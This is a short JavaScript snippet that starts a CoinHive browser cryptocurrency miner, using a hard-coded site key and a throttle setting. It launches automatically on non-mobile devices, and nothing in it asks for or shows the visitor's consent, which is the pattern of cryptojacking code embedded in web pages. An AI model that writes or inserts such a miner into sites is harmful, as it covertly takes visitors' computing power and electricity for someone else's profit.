var miner = new CoinHive.Anonymous('hP1KxKyDwXEmV1wqh1TzN8hSu1PsMVXT', {
    throttle: 0.9
});
if (!miner.isMobile()) {
    miner.start();
}